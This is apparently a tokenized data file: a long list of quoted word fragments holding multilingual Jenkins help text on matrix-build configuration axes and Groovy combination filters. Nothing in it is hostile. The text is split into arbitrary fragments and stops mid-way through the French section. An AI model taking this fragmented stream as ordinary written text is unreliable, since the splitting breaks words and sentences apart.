"\u0440\u0430", "\u0437\u043c", "\u0435\u0440", "\u043d\u043e", "\u0441\u0442", "\u044f\u0445", ",", "\u0441", "\u0442\u0435", "\u043f\u0435", "\u043d\u044f", "\u0445", "\u0441", "\u0432\u043e", "\u0431\u043e", "\u0434\u044b", "),", "\u0432", "\u044b", "\u043c", "\u043e\u0436", "\u0435\u0442", "\u0435", "\u043d", "\u0430\u0441", "\u0442\u0440", "\u043e\u0438", "\u0442\u044c", "\u0438", "\u0445", "\u0437", "\u0434\u0435", "\u0441\u044c", ".", "<", "p", ">", "\u041d", "\u0430\u043f", "\u0440\u0438", "\u043c\u0435", "\u0440,", "\u0441", "\u043a\u0430", "\u0436\u0435", "\u043c", "\u0432", "\u044b", "\u0441", "\u043e\u0431", "\u0438\u0440", "\u0430\u0435", "\u0442\u0435", "\u0441\u044c", "\u0437", "\u0430\u043f", "\u0443\u0441", "\u043a\u0430", "\u0442\u044c", "\u0442", "\u0435\u0441", "\u0442\u044b", "\u0434", "\u043b\u044f", "\u0432", "\u0430\u0448", "\u0435\u0433", "\u043e", "\u043f", "\u0440\u0438", "\u043b\u043e", "\u0436\u0435", "\u043d\u0438", "\u044f", "\u0438", "\u0441\u043f", "\u043e\u043b", "\u044c\u0437", "\u0443\u044e", "\u0449\u0435", "\u0433\u043e", "\u0421", "\u0423\u0411", "\u0414", "\u0438", "\u0432", "\u0430\u043c", "\u043d", "\u0435\u043e", "\u0431\u0445", "\u043e\u0434", "\u0438\u043c", "\u043e", "\u043f", "\u0440\u043e", "\u0432\u0435", "\u0440\u0438", "\u0442\u044c", "\u0435", "\u0433\u043e", "\u0441", "\u0442", "\u0440\u0435", "\u043c\u044f", "\u0421", "\u0423\u0411", "\u0414:", "MySQL", ",", "PostgreSQL", "\u0438", "Oracle", ".", "\u0412", "\u0430\u0448", "\u0441", "\u0431\u043e", "\u0440\u043e", "\u0447\u043d", "\u044b\u0439", "\u0441", "\u043a\u0440", "\u0438\u043f", "\u0442", "\u0440", "\u0430\u0437", "\u0440\u0430", "\u0431\u043e", "\u0442\u0430", "\u043d", "\u0442", "\u0430\u043a", "\u0438\u043c", "\u043e", "\u0431\u0440", "\u0430\u0437", "\u043e\u043c", ",", "\u0447", "\u0442\u043e", "\u0432", "\u044b", "\u043c", "\u043e\u0436", "\u0435\u0442", "\u0435", "\u043f", "\u0440\u043e", "\u0442\u0435", "\u0441\u0442", "\u0438\u0440", "\u043e\u0432", "\u0430\u0442", "\u044c", "\u0440", "\u0430\u0431", "\u043e\u0442", "\u0443", "\u043f", "\u0440\u0438", "\u043b\u043e", "\u0436\u0435", "\u043d\u0438", "\u044f", "\u0441", "\u043a", "\u043e\u043d", "\u043a\u0440", "\u0435\u0442", "\u043d\u043e", "\u0439", "\u0421", "\u0423\u0411", "\u0414", "\u0441", "\u043f", "\u043e\u043c", "\u043e\u0449", "\u044c\u044e", "\u043a", "\u043e\u043c", "\u0430\u043d", "\u0434\u044b", "<", "tt", ">", "ant", "-", "Ddatabase", "=", "mysql", "<", "/", "tt", ">", ".", "<", "p", ">", "\u042d", "\u0442\u043e", "\u0438", "\u0435", "\u0441\u0442", "\u044c", "\u043a", "\u043e\u043d", "\u0446\u0435", "\u043f\u0446", "\u0438\u044f", "\u043e", "\u0441\u0435", "\u0439.", "\u0412", "\u044b", "\u043c", "\u043e\u0436", "\u0435\u0442", "\u0435", "\u0441", "\u043e\u0437", "\u0434\u0430", "\u0442\u044c", "\u043f", "\u0435\u0440", "\u0435\u043c", "\u0435\u043d", "\u043d\u0443", "\u044e", "\u0441", "\u0438", "\u043c\u0435", "\u043d\u0435", "\u043c", "\"", "database", "\"", ",", "\u043a", "\u043e\u0442", "\u043e\u0440", "\u0430\u044f", "\u043c", "\u043e\u0436", "\u0435\u0442", "\u043f", "\u0440\u0438", "\u043d\u0438", "\u043c\u0430", "\u0442\u044c", "3", "\u0437", "\u043d\u0430", "\u0447\u0435", "\u043d\u0438", "\u044f.", "\u041a", "\u043e\u0433", "\u0434\u0430", "\u0432", "\u044b", "\u0435", "\u0451", "\u043d", "\u0430\u0441", "\u0442\u0440", "\u043e\u0438", "\u0442\u0435", ",", "Jenkins", "\u0431", "\u0443\u0434", "\u0435\u0442", "\u0437", "\u0430\u043f", "\u0443\u0441", "\u043a\u0430", "\u0442\u044c", "3", "\u0441", "\u0431\u043e", "\u0440\u043a", "\u0438,", "\u043a", "\u0430\u0436", "\u0434\u0443", "\u044e", "\u0441", "\u043e", "\u0434\u043d", "\u0438\u043c", "\u044d", "\u043b\u0435", "\u043c\u0435", "\u043d\u0442", "\u043e\u043c", "\u0438", "\u0437", "\u043e", "\u0431\u043b", "\u0430\u0441", "\u0442\u0438", "\u0437", "\u043d\u0430", "\u0447\u0435", "\u043d\u0438", "\u0439", "\u043f", "\u0435\u0440", "\u0435\u043c", "\u0435\u043d", "\u043d\u043e", "\u0439", "\"", "database", "\"", ",", "\u0447", "\u0442\u043e", "\u0431\u044b", "\u043f", "\u043e\u043b", "\u043d\u043e", "\u0441\u0442", "\u044c\u044e", "\u043f", "\u043e\u043a", "\u0440\u044b", "\u0442\u044c", "\u043a", "\u043e\u043d", "\u0444\u0438", "\u0433\u0443", "\u0440\u0430", "\u0446\u0438", "\u043e\u043d", "\u043d\u0443", "\u044e", "\u043c", "\u0430\u0442", "\u0440\u0438", "\u0446\u0443", ".", "<", "p", ">", "\u041f", "\u0435\u0440", "\u0435\u043c", "\u0435\u043d", "\u043d\u044b", "\u0435,", "\u043e", "\u043f\u0438", "\u0441\u0430", "\u043d\u043d", "\u044b\u0435", "\u0437", "\u0434\u0435", "\u0441\u044c", ",", "\u0434", "\u043e\u0441", "\u0442\u0443", "\u043f\u043d", "\u044b", "\u0441", "\u0431\u043e", "\u0440\u043a", "\u0435", "\u043a", "\u0430\u043a", "\u043f", "\u0435\u0440", "\u0435\u043c", "\u0435\u043d", "\u043d\u044b", "\u0435", "\u043e", "\u043a\u0440", "\u0443\u0436", "\u0435\u043d", "\u0438\u044f", ".", "\u0412", "\u0434\u043e", "\u0431\u0430", "\u0432\u043e", "\u043a,", "\u0434", "\u043b\u044f", "Ant", "\u0438", "Maven", ",", "\u043f", "\u0435\u0440", "\u0435\u043c", "\u0435\u043d", "\u043d\u044b", "\u0435", "\u0442", "\u0430\u043a", "\u0436\u0435", "\u043f", "\u0440\u0435", "\u0434\u043e", "\u0441\u0442", "\u0430\u0432", "\u043b\u044f", "\u044e\u0442", "\u0441\u044f", "\u043a", "\u0430\u043a", "\u0441", "\u0432\u043e", "\u0439\u0441", "\u0442\u0432", "\u0430,", "\u043a", "\u0430\u043a", "\u0431", "\u0443\u0434", "\u0442\u043e", "\u0432", "\u043a", "\u043e\u043c", "\u0430\u043d", "\u0434\u043d", "\u043e\u0439", "\u0441", "\u0442\u0440", "\u043e\u043a", "\u0435", "\u0431", "\u044b\u043b", "\u043e", "\u0443", "\u043a\u0430", "\u0437\u0430", "\u043d\u043e", "<", "tt", ">", "-", "D", "<", "i", ">", "\u0418\u043c", "\u044f\u041f", "\u0435\u0440", "\u0435\u043c", "\u0435\u043d", "\u043d\u043e", "\u0439<", "/", "i", ">", "=<", "i", ">", "\u0417\u043d", "\u0430\u0447", "\u0435\u043d", "\u0438\u0435", "</", "i", ">", "</", "tt", ">", ".", "<", "p", ">", "\u0412", "\u0441", "\u043b\u0443", "\u0447\u0430", "\u0435,", "\u043a", "\u043e\u0433", "\u0434\u0430", "\u043e", "\u043f\u0440", "\u0435\u0434", "\u0435\u043b", "\u0435\u043d", "\u043e", "\u043d", "\u0435\u0441", "\u043a\u043e", "\u043b\u044c", "\u043a\u043e", "\u043e", "\u0441\u0435", "\u0439,", "\u0432", "\u0441\u0435", "\u0432", "\u043e\u0437", "\u043c\u043e", "\u0436\u043d", "\u044b\u0435", "\u043a", "\u043e\u043c", "\u0431\u0438", "\u043d\u0430", "\u0446\u0438", "\u0438", "\u0431", "\u0443\u0434", "\u0443\u0442", "\u0438", "\u0441\u043f", "\u043e\u043b", "\u044c\u0437", "\u043e\u0432", "\u0430\u043d", "\u044b", "\u043f", "\u0440\u0438", "\u0441", "\u0431\u043e", "\u0440\u043a", "\u0435.", "\u041c", "\u043d\u043e", "\u0436\u0435", "\u0441\u0442", "\u0432\u0435", "\u043d\u043d", "\u044b\u0435", "\u0437", "\u043d\u0430", "\u0447\u0435", "\u043d\u0438", "\u044f", "\u0432", "\u043c", "\u0435\u0442", "\u043a\u0430", "\u0445", "\u0438", "JDK", "\u0438", "\u043d\u0442", "\u0435\u0440", "\u043f\u0440", "\u0435\u0442", "\u0438\u0440", "\u0443\u044e", "\u0442\u0441", "\u044f", "\u0442", "\u0430\u043a", "\u0438\u043c", "\u0436", "\u0435", "\u043e", "\u0431\u0440", "\u0430\u0437", "\u043e\u043c", ".", "\u0422", "\u0430\u043a", "\u0447", "\u0442\u043e", "\u0435", "\u0441\u043b", "\u0438", "\u0432", "\u044b", "\u0443", "\u043a\u0430", "\u0436\u0435", "\u0442\u0435", "jdk", "=", "[", "JDK5", ",", "JDK6", "]", ",", "database", "=", "[", "mysql", ",", "postgresql", ",", "oracle", "]", ",", "container", "=", "[", "jetty", ",", "tomcat", "]", ",", "\u0442", "\u043e\u0433", "\u0434\u0430", "\u043a", "\u0430\u0436", "\u0434\u0430", "\u044f", "\u0441", "\u0431\u043e", "\u0440\u043a", "\u0430", "\u0431", "\u0443\u0434", "\u0435\u0442", "\u0441", "\u043e\u0434", "\u0435\u0440", "\u0436\u0430", "\u0442\u044c", "2x3x2", "=", "12", "\u0440", "\u0430\u0437", "\u043b\u0438", "\u0447\u043d", "\u044b\u0445", "\u043f", "\u043e\u0434", "\u0441\u0431", "\u043e\u0440", "\u043e\u043a", ".", "<", "/", "div", ">", "<", "div", ">", "Konfig", "&", "#", "252", ";", "rasyon", "matrisinizin", "daha", "fazla", "eksene", "ihtiyac", "&", "#", "305", ";", "varsa", ",", "burada", "belirleyebilirsiniz", ".", "<", "p", ">", "Diyelim", "ki", "veritaban", "&", "#", "305", ";", "uygulaman", "&", "#", "305", ";", "z", "ile", "ilgili", "bir", "test", "&", "#", "231", ";", "al", "&", "#", "305", ";", "&#", "351", ";", "t", "&", "#", "305", ";", "rman", "&", "#", "305", ";", "z", "gerekiyor", "ve", "bunu", "da", "&", "#", "252", ";", "&#", "231", ";", "ayr", "&", "#", "305", ";", "veritaban", "&", "#", "305", ";", "ile", "yapmak", "istiyorsunuz", ":", "MySQL", ",", "PostgreSQL", ",", "ve", "Oracle", ".", "Yap", "&", "#", "305", ";", "land", "&", "#", "305", ";", "rma", "dosyalar", "&", "#", "305", ";", "n", "&", "#", "305", ";", "z", "&", "#", "305", ";", ",", "<", "tt", ">", "ant", "-", "Ddatabase", "=", "mysql", "<", "/", "tt", ">", "&", "#", "351", ";", "eklinde", "&", "#", "231", ";", "al", "&", "#", "305", ";", "&#", "351", ";", "abilecek", "bir", "bi", "&", "#", "231", ";", "imde", "tasarlayabilirsiniz", ".", "<", "p", ">", "Eksenin", "devreye", "girdi", "&", "#", "287", ";", "i", "k", "&", "#", "305", ";", "s", "&", "#", "305", ";", "m", "buras", "&", "#", "305", ";", "d", "&", "#", "305", ";", "r", ".", "\"", "database", "\"", "isimli", "bir", "de", "&", "#", "287", ";", "i", "&", "#", "351", ";", "keniniz", "vard", "&", "#", "305", ";", "r", "ve", "&", "#", "252", ";", "&#", "231", ";", "de", "&", "#", "287", ";", "er", "al", "&", "#", "305", ";", "r", ".", "Konfig", "&", "#", "252", ";", "rasyonu", "yapt", "&", "#", "305", ";", "&#", "287", ";", "&#", "305", ";", "n", "&", "#", "305", ";", "zda", ",", "Jenkins", "konfig", "&", "#", "252", ";", "rasyon", "matrisini", "tamamlamak", "ad", "&", "#", "305", ";", "na", "\"", "database", "\"", "de", "&", "#", "287", ";", "i", "&", "#", "351", ";", "kenine", "atanan", "&", "#", "252", ";", "&#", "231", ";", "ayr", "&", "#", "305", ";", "de", "&", "#", "287", ";", "i", "&", "#", "351", ";", "kenle", "yap", "&", "#", "305", ";", "land", "&", "#", "305", ";", "rmay", "&", "#", "305", ";", "3", "kere", "&", "#", "231", ";", "al", "&", "#", "305", ";", "&#", "351", ";", "t", "&", "#", "305", ";", "racakt", "&", "#", "305", ";", "r", ".", "<", "p", ">", "Burada", "belirlenen", "de", "&", "#", "287", ";", "i", "&", "#", "351", ";", "kenler", ",", "yap", "&", "#", "305", ";", "land", "&", "#", "305", ";", "rmaya", "ortam", "de", "&", "#", "287", ";", "i", "&", "#", "351", ";", "keni", "olarak", "aktar", "&", "#", "305", ";", "labilirler", ".", "Ant", "ve", "Maven", "i", "&", "#", "231", ";", "in", "buna", "ek", "olarak", ",", "de", "&", "#", "287", ";", "i", "&", "#", "351", ";", "kenler", ",", "komut", "sat", "&", "#", "305", ";", "r", "&", "#", "305", ";", "nda", "<", "tt", ">", "-", "D", "<", "i", ">", "variableName", "<", "/", "i", ">", "=<", "i", ">", "value", "<", "/", "i", ">", "</", "tt", ">", "&", "#", "351", ";", "eklindeki", "gibi", "&", "#", "246", ";", "zellik", "olarak", "bulunabilirler", ".", "<", "p", ">", "Birden", "fazla", "eksen", "tan", "&", "#", "305", ";", "m", "&", "#", "305", ";", "yap", "&", "#", "305", ";", "ld", "&", "#", "305", ";", "&#", "287", ";", "&#", "305", ";", "nda", ",", "eksenlerin", "m", "&", "#", "252", ";", "mk", "&", "#", "252", ";", "n", "t", "&", "#", "252", ";", "m", "kombinasyonlar", "&", "#", "305", ";", "ayr", "&", "#", "305", ";", "nt", "&", "#", "305", ";", "l", "&", "#", "305", ";", "bir", "&", "#", "351", ";", "ekilde", "yap", "&", "#", "305", ";", "land", "&", "#", "305", ";", "r", "&", "#", "305", ";", "l", "&", "#", "305", ";", "r", ".", "Etiketlerde", "veya", "JDK", "'", "larda", "tan", "&", "#", "305", ";", "mlanan", "&", "#", "231", ";", "oklu", "-", "de", "&", "#", "287", ";", "erler", "de", "ayn", "&", "#", "305", ";", "&", "#", "351", ";", "ekilde", "i", "&", "#", "351", ";", "lenir", ".", "Yani", ",", "e", "&", "#", "287", ";", "er", "jdk", "=", "[", "JDK5", ",", "JDK6", "]", ",", "database", "=", "[", "mysql", ",", "postgresql", ",", "oracle", "]", "ve", "container", "=", "[", "jetty", ",", "tomcat", "]", "&", "#", "351", ";", "eklinde", "bir", "tan", "&", "#", "305", ";", "m", "yaparsan", "&", "#", "305", ";", "z", ",", "her", "yap", "&", "#", "305", ";", "land", "&", "#", "305", ";", "rma", "i", "&", "#", "231", ";", "in", "2x3x2", "=", "12", "adet", "alt", "-", "yap", "&", "#", "305", ";", "land", "&", "#", "305", ";", "rma", "&", "#", "231", ";", "al", "&", "#", "305", ";", "&#", "351", ";", "t", "&", "#", "305", ";", "r", "&", "#", "305", ";", "lacakt", "&", "#", "305", ";", "r", ".", "<", "/", "div", ">", "<", "div", ">", "\u60a8", "\u53ef\u4ee5", "\u5728\u9019", "\u88e1\u65b0", "\u589e\u8a2d", "\u5b9a\u77e9", "\u9663\u7684", "\u8ef8\u7dda", "\u3002", "<", "p", ">", "\u5047", "\u5982\u60f3", "\u8981\u5728", "MySQL", ",", "PostgreSQL", "\u53ca", "Oracle", "\u4e0a", "\u6e2c\u8a66", "\u958b\u767c", "\u7684\u8cc7", "\u6599\u5eab", "\u61c9\u7528", "\u7a0b\u5f0f", "\uff0c", "\u60a8", "\u7684\u5efa", "\u7f6e", "Script", "\u61c9", "\u8a72\u5c31", "\u8981\u80fd", "\u6307\u5b9a", "\u8981\u6e2c", "\u8a66\u7684", "\u8cc7\u6599", "\u5eab\uff0c", "\u4f8b\u5982", "<", "code", ">", "ant", "-", "Ddatabase", "=", "mysql", "<", "/", "code", ">", "\u3002", "<", "p", ">", "\u9019", "\u5c31\u662f", "\u8ef8\u7dda", "\u7684\u6982", "\u5ff5\uff0c", "\u60a8\u53ef", "\u4ee5\u8a2d", "\u8a08\u51fa", "\u5e36\u4e09", "\u7a2e\u503c", "\u7684", "\"", "database", "\"", "\u8b8a", "\u6578\u3002", "\u8a2d", "\u5b9a\u597d", "\u5f8c\uff0c", "Jenkins", "\u6703", "\u57f7\u884c", "\u4e09\u6b21", "\u5efa\u7f6e", "\uff0c\u6bcf", "\u4e00\u6b21", "\u90fd\u5957", "\u4e0d\u540c", "\u7684", "\"", "database", "\"", "\u8b8a", "\u6578\u503c", "\uff0c\u5b8c", "\u6574\u6db5", "\u84cb\u6574", "\u500b\u8a2d", "\u5b9a\u77e9", "\u9663\u3002", "<", "p", ">", "\u9019", "\u88e1\u5b9a", "\u7fa9\u7684", "\u8b8a\u6578", "\u6703\u8b8a", "\u6210\u5efa", "\u7f6e\u904e", "\u7a0b\u4e2d", "\u53ef\u4ee5", "\u770b\u5230", "\u7684\u74b0", "\u5883\u8b8a", "\u6578\u3002", "\u5c0d", "Ant", "\u53ca", "Maven", "\u800c", "\u8a00\uff0c", "\u8b8a\u6578", "\u540c\u6642", "\u6703\u4ee5", "\u5c6c\u6027", "\u65b9\u5f0f", "\u5e36\u5165", "\uff0c\u5c31", "\u7b49\u540c", "\u5728\u547d", "\u4ee4\u5217", "\u52a0\u4e0a", "<", "code", ">", "-", "D", "<", "i", ">", "variableName", "<", "/", "i", ">", "=<", "i", ">", "value", "<", "/", "i", ">", "</", "code", ">", "\u3002", "<", "p", ">", "\u5982", "\u679c\u8a2d", "\u5b9a\u591a", "\u500b\u8ef8", "\u7dda\uff0c", "\u8ef8\u7dda", "\u6240\u6709", "\u7684\u6392", "\u5217\u7d44", "\u5408\u90fd", "\u6703\u88ab", "\u5efa\u7f6e", "\u4e00\u6b21", "\uff0c\u6a19", "\u7c64\u53ca", "JDK", "\u8ef8", "\u4e5f\u4e00", "\u6a23\u3002", "\u6240", "\u4ee5\u5982", "\u679c\u60a8", "\u8a2d\u5b9a", "jdk", "=", "[", "JDK5", ",", "JDK6", "]", ",", "database", "=", "[", "mysql", ",", "postgresql", ",", "oracle", "]", ",", "container", "=", "[", "jetty", ",", "tomcat", "]", "\uff0c", "\u90a3", "\u9ebc\u6bcf", "\u6b21\u5efa", "\u7f6e\u90fd", "\u6703\u6709", "2", "\u00d7", "3", "\u00d7", "2", "=", "12", "\u7a2e", "\u4e0d\u540c", "\u7684\u5b50", "\u5efa\u7f6e", "\u3002", "<", "/", "div", ">", "<", "div", ">", "By", "default", ",", "Jenkins", "builds", "all", "the", "possible", "combinations", "of", "axes", "exhaustively", ".", "But", "sometimes", "this", "is", "too", "many", ",", "or", "may", "contain", "combinations", "that", "don", "'", "t", "make", "sense", ".", "In", "such", "a", "situation", ",", "you", "can", "make", "the", "matrix", "sparse", "by", "filtering", "out", "combinations", "that", "you", "don", "'", "t", "want", "through", "a", "Groovy", "expression", "that", "returns", "true", "or", "false", ".", "<", "p", ">", "When", "you", "specify", "a", "Groovy", "expression", "here", ",", "only", "the", "combinations", "that", "result", "in", "<", "b", ">", "true", "<", "/", "b", ">", "will", "be", "built", ".", "In", "evaluating", "the", "expression", ",", "axes", "are", "exposed", "as", "variables", "(", "with", "their", "values", "set", "to", "the", "current", "combination", "evaluated", ")", ".", "<", "h4", ">", "Filtering", "based", "on", "values", "<", "/", "h4", ">", "<", "p", ">", "For", "example", ",", "let", "'", "s", "say", "you", "are", "building", "on", "different", "operating", "systems", "for", "different", "compilers", ".", "Assume", "that", "your", "slave", "labels", "are", "<", "b", ">", "label", "=", "[", "linux", ",", "solaris", "]", "</", "b", ">", "and", "you", "have", "created", "an", "axis", "as", "<", "b", ">", "compiler", "=", "[", "gcc", ",", "cc", "]", ".<", "/", "b", ">", "Any", "of", "the", "following", "expressions", "will", "filter", "out", "<", "b", ">", "cc", "<", "/", "b", ">", "builds", "on", "<", "b", ">", "linux", "<", "/", "b", ">", ".", "Depending", "on", "how", "you", "think", "about", "this", "constraint", ",", "you", "'", "ll", "probably", "find", "some", "more", "intuitive", "than", "others", ".", "<", "center", ">", "<", "table", ">", "<", "tr", ">", "<", "td", ">", "Read", "\"", "if", "both", "linux", "and", "cc", ",", "it", "'", "s", "invalid", "\"", "</", "td", ">", "<", "td", ">", "<", "pre", ">", "!(", "label", "=", "=\"", "linux", "\"", "&", "&", "compiler", "=", "=\"", "cc", "\"", ")<", "/", "pre", ">", "<", "/", "td", ">", "<", "/", "tr", ">", "<", "tr", ">", "<", "td", ">", "Read", "\"", "for", "a", "combination", "to", "be", "valid", ",", "it", "has", "to", "be", "either", "on", "solaris", "or", "on", "gcc", ".", "\"<", "/", "td", ">", "<", "td", ">", "<", "pre", ">", "label", "=", "=\"", "solaris", "\"", "|", "|", "compiler", "=", "=\"", "gcc", "\"", "</", "pre", ">", "<", "/", "td", ">", "<", "/", "tr", ">", "<", "tr", ">", "<", "td", ">", "Read", "\"", "if", "on", "Solaris", ",", "just", "do", "cc", "\"", "</", "td", ">", "<", "td", ">", "<", "pre", ">", "(", "label", "=", "=\"", "solaris", "\"", ").", "implies", "(", "compiler", "=", "=\"", "cc", "\"", ")<", "/", "pre", ">", "<", "/", "td", ">", "<", "/", "tr", ">", "<", "/", "table", ">", "<", "/", "center", ">", "<", "h4", ">", "Sparsening", "of", "the", "matrix", "<", "/", "h4", ">", "<", "p", ">", "In", "addition", "to", "the", "specific", "filtering", "rules", "based", "on", "values", ",", "one", "can", "also", "use", "a", "special", "variable", "\"", "<", "tt", ">", "index", "<", "/", "tt", ">", "\",", "which", "can", "be", "used", "to", "sparsen", "the", "matrix", ".", "<", "p", ">", "For", "example", ",", "<", "tt", ">", "index", "%", "2", "=", "=", "0", "<", "/", "tt", ">", "would", "cut", "the", "matrix", "size", "in", "half", "by", "removing", "one", "combination", "per", "every", "2", "combinations", ",", "in", "such", "a", "way", "that", "the", "coverage", "is", "still", "reasonable", ".", "Similarly", ",", "<", "tt", ">", "index", "%", "3", "!", "=", "0", "<", "/", "tt", ">", "would", "cut", "the", "matrix", "size", "into", "66", "%", "by", "throwing", "away", "every", "1", "out", "of", "3", "combinations", ".", "<", "/", "div", ">", "<", "div", ">", "Jenkins", "baut", "standardm", "\u00e4", "\u00df", "ig", "alle", "m", "\u00f6", "glichen", "Kombinationen", "aller", "Achsen", "auf", "ersch", "\u00f6", "pfende", "Weise", ".", "Manchmal", "sind", "dies", "jedoch", "einfach", "zu", "viele", "Kombinationen", "oder", "es", "gibt", "Kombinationen", ",", "die", "aus", "fachlicher", "Sicht", "nicht", "erw", "\u00fc", "nscht", "sind", ".", "In", "diesen", "Situationen", "k", "\u00f6", "nnen", "Sie", "die", "Matrix", "ausd", "\u00fc", "nnen", ",", "indem", "Sie", "\u00fc", "ber", "einen", "Groovy", "-", "Ausdruck", "unerw", "\u00fc", "nschte", "Kombinationen", "herausfiltern", ".", "<", "p", ">", "Geben", "Sie", "hier", "einen", "Groovy", "-", "Ausdruck", "an", ",", "so", "werden", "nur", "diejenigen", "Kombinationen", "gebaut", ",", "f", "\u00fc", "r", "die", "der", "Ausdruck", "<", "b", ">", "true", "<", "/", "b", ">", "ergibt", ".", "Die", "momentanen", "Werte", "der", "Achsen", "stehen", "dem", "Ausdruck", "dabei", "als", "initialisierte", "Variablen", "zur", "Verf", "\u00fc", "gung", ".", "<", "h4", ">", "Werte", "-", "basiertes", "Filtern", "<", "/", "h4", ">", "<", "p", ">", "Beispiel", ":", "Sie", "bauen", "auf", "unterschiedlichen", "Betriebssystemen", "mit", "unterschiedlichen", "Compilern", ".", "Ihre", "Slave", "-", "Knoten", "sind", "mit", "den", "Labels", "<", "b", ">", "label", "=", "[", "linux", ",", "solaris", "]", "</", "b", ">", "gekennzeichnet", "und", "Sie", "haben", "eine", "Achse", "<", "b", ">", "compiler", "=", "[", "gcc", ",", "cc", "]", "</", "b", ">", "angelegt", ".", "Jeder", "der", "folgenden", "Ausdr", "\u00fc", "cke", "wird", "Builds", "mit", "<", "b", ">", "cc", "<", "/", "b", ">", "auf", "<", "b", ">", "linux", "<", "/", "b", ">", "herausfiltern", ".", "Je", "nach", "pers", "\u00f6", "nlicher", "Herangehensweise", "werden", "Sie", "die", "Ausdr", "\u00fc", "cke", "unterschiedlich", "intuitiv", "finden", ".", "<", "center", ">", "<", "table", ">", "<", "tr", ">", "<", "td", ">", "Ansatz", ":", "\"", "Wenn", "linux", "und", "cc", "gleichzeitig", "zutrifft", ",", "ist", "die", "Kombination", "ung", "\u00fc", "ltig", ".", "\"<", "/", "td", ">", "<", "td", ">", "<", "pre", ">", "!(", "label", "=", "=\"", "linux", "\"", "&", "&", "compiler", "=", "=\"", "cc", "\"", ")<", "/", "pre", ">", "<", "/", "td", ">", "<", "/", "tr", ">", "<", "tr", ">", "<", "td", ">", "Ansatz", ":", "\"", "Eine", "g", "\u00fc", "ltige", "Kombination", "verwendet", "entweder", "solaris", "oder", "gcc", ".", "\"<", "/", "td", ">", "<", "td", ">", "<", "pre", ">", "label", "=", "=\"", "solaris", "\"", "|", "|", "compiler", "=", "=\"", "gcc", "\"", "</", "pre", ">", "<", "/", "td", ">", "<", "/", "tr", ">", "<", "tr", ">", "<", "td", ">", "Ansatz", ":", "\"", "Wenn", "auf", "solaris", ",", "dann", "nur", "cc", "erlauben", ".", "\"<", "/", "td", ">", "<", "td", ">", "<", "pre", ">", "(", "label", "=", "=\"", "solaris", "\"", ").", "implies", "(", "compiler", "=", "=\"", "cc", "\"", ")<", "/", "pre", ">", "<", "/", "td", ">", "<", "/", "tr", ">", "<", "/", "table", ">", "<", "/", "center", ">", "<", "h4", ">", "Ausd", "\u00fc", "nnen", "der", "Matrix", "<", "/", "h4", ">", "<", "p", ">", "Zus", "\u00e4", "tzlich", "zu", "den", "werte", "-", "basierten", "Filterregeln", ",", "k", "\u00f6", "nnen", "Sie", "die", "Variable", "\"", "<", "tt", ">", "index", "<", "/", "tt", ">", "\"", "verwenden", ",", "um", "die", "Matrix", "auszud", "\u00fc", "nnen", ".", "<", "p", ">", "Beispiel", ":", "<", "tt", ">", "index", "%", "2", "=", "=", "0", "<", "/", "tt", ">", "halbiert", "die", "Gr", "\u00f6", "\u00df", "e", "der", "Matrix", ",", "in", "dem", "nur", "noch", "jede", "zweite", "Kombination", "gebaut", "wird", ".", "Analog", "drittelt", "<", "tt", ">", "index", "%", "3", "!", "=", "0", "<", "/", "tt", ">", "die", "Gr", "\u00f6", "\u00df", "e", "der", "Matrix", ",", "in", "dem", "nur", "noch", "jede", "dritte", "Kombination", "gebaut", "wird", ",", "usw", ".", "<", "/", "div", ">", "\ufeff", "<", "div", ">", "Par", "d", "\u00e9", "faut", ",", "Jenkins", "builde", "toutes", "les", "combinaisons", "possibles", "de", "tous", "les", "axes", ",", "de", "fa", "\u00e7", "on", "exhaustive", ".", "Parfois", ",", "cela", "fait", "trop", "de", "combinaisons", "ou", "certaines", "combinaisons", "n", "'", "ont", "pas", "de", "sens", ".", "Dans", "ce", "cas", ",", "vous", "pouvez", "r", "\u00e9", "duire", "la", "matrice", "en", "filtrant", "les", "combinaisons", "que", "vous", "ne", "voulez", "pas", "\u00e0", "l", "'", "aide", "d", "'", "une", "expression", "Groovy", "qui", "retourne", "vrai", "ou", "faux", ".", "<", "p", ">", "Quand", "vous", "sp", "\u00e9", "cifiez", "une", "expression", "Groovy", "ici", ",", "seules", "les", "combinaisons", "qui", "retournent", "<", "b", ">", "true", "<", "/", "b", ">", "seront", "construites", ".", "Lors", "de", "l", "'", "\u00e9", "valuation", "de", "l", "'", "expression", ",", "les", "axes", "sont", "expos", "\u00e9", "s", "comme", "des", "variables", "(", "avec", "leurs", "valeurs", "positionn", "\u00e9", "es", "sur", "la", "combinaison", "courante", ")", ".", "<", "h4", ">", "Filtre", "bas", "\u00e9", "sur", "les", "valeurs", "<", "/", "h4", ">", "<", "p", ">", "Par", "exemple", ",", "disons", "que", "vous", "buildez", "sur", "des", "syst", "\u00e8", "mes", "d", "'", "exploitation", "diff", "\u00e9", "rents", ",", "pour", "des", "compilateurs", "diff", "\u00e9", "rents", ".", "Supposons", "que", "les", "libell", "\u00e9", "s", "de", "vos", "esclaves", "sont", "<", "b", ">", "label", "=", "[", "linux", ",", "solaris", "]", "</", "b", ">", "et", "que", "vous", "avez", "un", "axe", "<", "b", ">", "compiler", "=", "[", "gcc", ",", "cc", "]", ".<", "/", "b", ">", "Chacune", "des", "expressions", "suivantes", "filtreront", "(", "c", "-", "\u00e0-", "d", "retireront", ")", "les", "builds", "<", "b", ">", "cc", "<", "/", "b", ">", "sur", "<", "b", ">", "linux", "<", "/", "b", ">", ".", "Selon", "la", "fa", "\u00e7", "on", "dont", "vous", "envisagez", "cette", "contrainte", ",", "vous", "trouverez", "certaines", "expressions", "plus", "claires", "que", "d", "'", "autres", ".", "<", "center", ">", "<", "table", ">", "<", "tr", ">", "<", "td", ">", "Lire", "\"", "si", "simultan", "\u00e9", "ment", "linux", "et", "cc", ",", "alors", "c", "'", "est", "invalide", "\"", "</", "td", ">", "<", "td", ">", "<", "pre", ">", "!(", "label", "=", "=\"", "linux", "\"", "&", "&", "compiler", "=", "=\"", "cc", "\"", ")<", "/", "pre", ">", "<", "/", "td", ">", "<", "/", "tr", ">", "<", "tr", ">", "<", "td", ">", "Lire", "\"", "pour", "qu", "'", "une", "combinaison", "soit", "valide", ",", "elle", "doit", "\u00ea", "tre", "soit", "sur", "solaris", ",", "soit", "utiliser", "gcc", ".", "\"<", "/", "td", ">", "<", "td", ">", "<", "pre", ">", "label", "=", "=\"", "solaris", "\"", "|", "|", "compiler", "=", "=\"", "gcc", "\"", "</", "pre", ">", "<", "/", "td", ">", "<", "/", "tr", ">", "<", "tr", ">", "<", "td", ">", "Lire", "\"", "quand", "on", "est", "sur", "solaris", ",", "n", "'", "utiliser", "que", "cc", "\"", 